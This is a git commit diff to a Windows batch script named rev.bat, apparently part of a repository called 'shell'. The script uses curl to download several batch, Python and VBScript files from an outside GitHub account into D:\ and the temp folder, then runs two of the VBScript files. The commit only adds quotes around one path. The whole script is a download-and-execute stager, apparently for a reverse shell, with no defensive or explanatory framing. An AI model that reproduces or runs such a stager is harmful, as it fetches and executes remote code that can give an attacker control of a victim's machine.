300bb65704494a642c3c94bb2f49f5aebb3e1505
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-03 05:48:00 +0300

    Update rev.bat

--- rev.bat
+++ rev.bat
@@ -3,7 +3,7 @@ set "temp_dir=%temp%"
 curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o D:\pro.bat 
 curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o D:\sh.py 
 curl https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs -o D:\vb.vbs 
-curl https://raw.githubusercontent.com/0x2034/shell/main/vb1.vbs -o %temp_dir%\vb1.vbs
+curl https://raw.githubusercontent.com/0x2034/shell/main/vb1.vbs -o "%temp_dir%\vb1.vbs"
 start /wait D:\vb.vbs
 call %temp_dir%\vb1.vbs
 exit
